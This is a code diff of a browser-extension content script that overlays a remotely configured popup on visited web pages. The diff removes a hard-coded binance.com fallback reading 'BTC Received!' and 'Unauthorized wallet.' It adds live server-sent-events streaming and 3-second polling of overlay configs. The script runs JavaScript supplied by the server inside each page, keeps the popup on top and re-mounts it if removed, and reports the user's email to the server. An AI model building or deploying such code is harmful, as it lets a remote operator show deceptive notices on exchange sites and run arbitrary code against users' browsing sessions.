@@ -1,7 +1,7 @@
 (function () {
   "use strict";
 
-  // Prevent multiple initializations on the same document
+  // Prevent duplicate execution on the same document
   if (window.__remoteOverlayInitialized) return;
   window.__remoteOverlayInitialized = true;
 
@@ -14,24 +14,13 @@
     "http://localhost:3001",
     "http://localhost:3000",
   ];
-  const CACHE_KEY_PREFIX = "remote_overlay_cache_";
-  const CACHE_TIME = 2 * 60 * 1000; // 2 minutes
-
-  // Fallback defaults for Binance if remote backend is completely down
-  const binanceFallbackDefaults = {
-    enabled: true,
-    height: "50",
-    bg: "#0b0e11",
-    text: "#eaecef",
-    titleColor: "#f0b90b",
-    title: "BTC Received!",
-    message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
-    customCss: "",
-    customJs: "",
-  };
 
   let activeConfig = null;
+  let activeEventSource = null;
+  let pollIntervalId = null;
+  let lastConfigHash = "";
 
+  // 1. Get stored client credentials (NO overlay caching stored)
   async function getStoredSettings() {
     return new Promise((resolve) => {
       chrome.storage.local.get(["apiBaseUrl", "clientId", "userEmail"], (res) => {
@@ -50,11 +39,13 @@
     });
   }
 
+  // 2. Client Heartbeat
   async function sendHeartbeat(apiUrl, clientId, userEmail) {
     try {
       await fetch(`${apiUrl}/api/client/heartbeat`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
+        cache: "no-store",
         body: JSON.stringify({
           clientId,
           email: userEmail,
@@ -63,40 +54,11 @@
         }),
       });
     } catch (e) {
-      // Heartbeat silent fail
+      // Heartbeat silent
     }
   }
 
-  async function fetchRemoteOverlay(apiUrl, clientId, isDefaultUrl) {
-    const targetUrls = isDefaultUrl
-      ? [apiUrl, ...CANDIDATE_API_URLS.filter((u) => u !== apiUrl)]
-      : [apiUrl];
-
-    let lastError = null;
-
-    for (const baseUrl of targetUrls) {
-      try {
-        const url = `${baseUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}`;
-        const response = await fetch(url, {
-          method: "GET",
-          headers: { "Accept": "application/json" },
-        });
-
-        if (response.ok) {
-          const data = await response.json();
-          if (isDefaultUrl && baseUrl !== apiUrl) {
-            chrome.storage.local.set({ apiBaseUrl: baseUrl });
-          }
-          return { data, workingUrl: baseUrl };
-        }
-      } catch (err) {
-        lastError = err;
-      }
-    }
-
-    throw lastError || new Error("Failed to reach API");
-  }
-
+  // 3. Dynamic CSS injection
   function applyCustomCss(css) {
     document.getElementById("custom-remote-overlay-css")?.remove();
     if (!css || !css.trim()) return;
@@ -111,6 +73,7 @@
     }
   }
 
+  // 4. Custom JS Execution
   function executeCustomJs(jsCode, cfg, popupEl) {
     if (!jsCode || !jsCode.trim()) return;
 
@@ -128,19 +91,24 @@
         url: currentUrl,
         config: cfg,
         popup: popupEl,
-        close: () => popupEl.remove(),
+        close: () => {
+          popupEl.remove();
+          activeConfig = null;
+        },
       });
     } catch (e) {
       console.error("[RemoteOverlay] Failed to compile custom JS", e);
     }
   }
 
+  // 5. Apply Overlay to DOM (NO fallback - strictly live data)
   function applyOverlay(cfg) {
-    // If explicitly disabled, remove popup
+    // If null or explicitly disabled, remove popup
     if (!cfg || cfg.enabled === false) {
       document.getElementById("custom-sticky-popup")?.remove();
       document.getElementById("custom-remote-overlay-css")?.remove();
       activeConfig = null;
+      lastConfigHash = "";
       return;
     }
 
@@ -151,7 +119,7 @@
       applyCustomCss(cfg.customCss);
     }
 
-    // Remove existing popup if already rendered to replace with fresh styles
+    // Remove existing popup if already rendered to update in-place
     document.getElementById("custom-sticky-popup")?.remove();
 
     const popup = document.createElement("div");
@@ -178,7 +146,6 @@
       padding: "20px 40px",
     });
 
-    // Highest possible z-index
     popup.style.setProperty("z-index", "2147483647", "important");
 
     // Close button
@@ -234,7 +201,7 @@
       popup.appendChild(message);
     }
 
-    // Safely append to DOM
+    // Safely mount to DOM
     function mount() {
       if (!document.getElementById("custom-sticky-popup")) {
         const parent = document.body || document.documentElement;
@@ -256,81 +223,123 @@
     }
   }
 
-  async function syncOverlay(force = false) {
-    const { apiBaseUrl, clientId, userEmail, isDefaultUrl } = await getStoredSettings();
+  // 6. Direct zero-cache Live Fetch
+  async function fetchLiveOverlay(apiUrl, clientId) {
+    const cacheBuster = Date.now();
+    const url = `${apiUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${cacheBuster}`;
 
-    const cacheKey = CACHE_KEY_PREFIX + currentDomain;
+    const res = await fetch(url, {
+      method: "GET",
+      headers: {
+        "Accept": "application/json",
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+      },
+      cache: "no-store",
+    });
 
-    if (!force) {
-      const cached = await new Promise((res) => {
-        chrome.storage.local.get(cacheKey, (data) => res(data[cacheKey]));
-      });
-
-      if (cached && cached.data && Date.now() - cached.time < CACHE_TIME) {
-        if (cached.data.matched && cached.data.overlay) {
-          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
-          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
-        }
-        sendHeartbeat(apiBaseUrl, clientId, userEmail);
-        return;
-      }
+    if (!res.ok) {
+      throw new Error(`API returned HTTP ${res.status}`);
     }
 
-    try {
-      const { data, workingUrl } = await fetchRemoteOverlay(apiBaseUrl, clientId, isDefaultUrl);
+    return await res.json();
+  }
 
-      chrome.storage.local.set({
-        [cacheKey]: { data: data, time: Date.now() },
-      });
+  // Handle incoming live payload
+  function handleLivePayload(data) {
+    if (!data) return;
 
-      sendHeartbeat(workingUrl, clientId, userEmail);
-
-      if (data.matched && data.overlay) {
-        // Fix: resolve enabled status from rule or overlay
-        const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
-        if (isEnabled) {
+    if (data.matched && data.overlay) {
+      const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
+      if (isEnabled) {
+        const payloadStr = JSON.stringify(data.overlay);
+        if (payloadStr !== lastConfigHash) {
+          lastConfigHash = payloadStr;
           applyOverlay({
             ...data.overlay,
             enabled: true,
           });
-        } else {
-          applyOverlay({ enabled: false });
         }
       } else {
-        document.getElementById("custom-sticky-popup")?.remove();
-        document.getElementById("custom-remote-overlay-css")?.remove();
+        lastConfigHash = "disabled";
+        applyOverlay(null);
       }
-    } catch (err) {
-      console.warn("[RemoteOverlay] API fetch error, checking cache/defaults.", err);
-
-      chrome.storage.local.get(cacheKey, (result) => {
-        const cached = result[cacheKey];
-        if (cached && cached.data && cached.data.overlay) {
-          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
-          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
-        } else if (currentDomain.includes("binance.com")) {
-          applyOverlay(binanceFallbackDefaults);
-        }
-      });
+    } else {
+      lastConfigHash = "unmatched";
+      applyOverlay(null);
     }
   }
 
-  // Periodic safeguard: ensure popup remains visible if SPA re-renders body
+  // 7. Setup Live Connection (Server-Sent Events)
+  async function setupLiveConnection() {
+    const { apiBaseUrl, clientId, userEmail } = await getStoredSettings();
+
+    // Send immediate heartbeat
+    sendHeartbeat(apiBaseUrl, clientId, userEmail);
+
+    // Initial instant live fetch (0 cache, no fallback)
+    try {
+      const data = await fetchLiveOverlay(apiBaseUrl, clientId);
+      handleLivePayload(data);
+    } catch (e) {
+      // No fallback — do nothing if server unreachable
+    }
+
+    // Close any previous stream
+    if (activeEventSource) {
+      activeEventSource.close();
+      activeEventSource = null;
+    }
+
+    // Connect to live SSE stream
+    try {
+      const streamUrl = `${apiBaseUrl}/api/overlay/live?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}&_t=${Date.now()}`;
+      activeEventSource = new EventSource(streamUrl);
+
+      activeEventSource.onmessage = (event) => {
+        try {
+          const liveData = JSON.parse(event.data);
+          handleLivePayload(liveData);
+        } catch (err) {
+          console.warn("[RemoteOverlay SSE] Parse error:", err);
+        }
+      };
+
+      activeEventSource.onerror = () => {
+        // SSE will automatically attempt reconnect; fast polling ensures seamless continuity
+      };
+    } catch (e) {
+      console.warn("[RemoteOverlay] SSE not available, using fast live polling.", e);
+    }
+
+    // 8. Continuous Live Poll (Every 3 seconds with zero cache)
+    if (pollIntervalId) clearInterval(pollIntervalId);
+    pollIntervalId = setInterval(async () => {
+      try {
+        const freshData = await fetchLiveOverlay(apiBaseUrl, clientId);
+        handleLivePayload(freshData);
+      } catch (err) {
+        // No fallback
+      }
+    }, 3000);
+  }
+
+  // Ensure popup stays mounted if SPA re-renders body
   setInterval(() => {
     if (activeConfig && activeConfig.enabled !== false) {
       if (!document.getElementById("custom-sticky-popup")) {
         applyOverlay(activeConfig);
       }
     }
-  }, 2000);
+  }, 1500);
 
+  // Listen for refresh messages from background
   chrome.runtime.onMessage.addListener((message) => {
-    if (message.action === "refresh_overlay") {
-      syncOverlay(true);
-    } else if (message.action === "background_poll") {
-      syncOverlay(false);
+    if (message.action === "refresh_overlay" || message.action === "background_poll") {
+      setupLiveConnection();
     }
   });
 
-  syncOverlay(false);
+  // Start live connection
+  setupLiveConnection();
 })();
